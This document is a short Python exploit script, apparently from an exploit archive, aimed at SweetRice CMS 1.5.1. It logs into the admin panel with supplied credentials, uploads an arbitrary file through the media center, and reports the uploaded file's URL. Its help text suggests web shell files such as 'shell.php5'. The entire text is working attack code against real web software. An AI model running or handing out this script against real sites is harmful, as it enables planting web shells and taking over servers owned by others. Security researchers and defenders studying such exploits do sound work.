#/usr/bin/python
# Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload
# Exploit Author: Osman Tunahan ARIKAN
# Version: 1.5.1
# Platform: WebApp - PHP - Mysql

import requests
import argparse
from requests import session

def exploit(r):
    global args
    payload = {
        'user': args.username,
        'passwd': args.password,
        'rememberMe': ''
    }

    login_url = f'{args.target}/as/?type=signin'
    upload_url = f'{args.target}/as/?type=media_center&mode=upload'

    try:
        req = r.post(login_url, data=payload)
        req.raise_for_status()

        success_message = 'Login success'
        if success_message in req.text:
            print("[+] Login Successfully...")
        else:
            print("[-] Incorrect username or password...")
            print("Goodbye...")
            exit()

        # File Upload
        files = {'upload[]': open(args.filename, 'rb')}
        uploadfile = r.post(upload_url, files=files)
        uploadfile.raise_for_status()

        if 'File Uploaded' in uploadfile.text:
            print("[+] File Uploaded Successfully...")
            print(f"[+] URL: {args.target}/attachment/{args.filename}")
        else:
            print("[-] File upload failed.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        print("Goodbye...")
        exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SweetRice CMS - Arbitrary File Upload Exploit')
    parser.add_argument('target', help='Target login URL (e.g., http://example.com/)')
    parser.add_argument('--username', required=True, help='Login username')
    parser.add_argument('--password', required=True, help='Login password')
    parser.add_argument('--filename', required=True, help='Shell Filename (Example: .htaccess, shell.php5, index.html)')

    args = parser.parse_args()
    with session() as r:
        exploit(r)
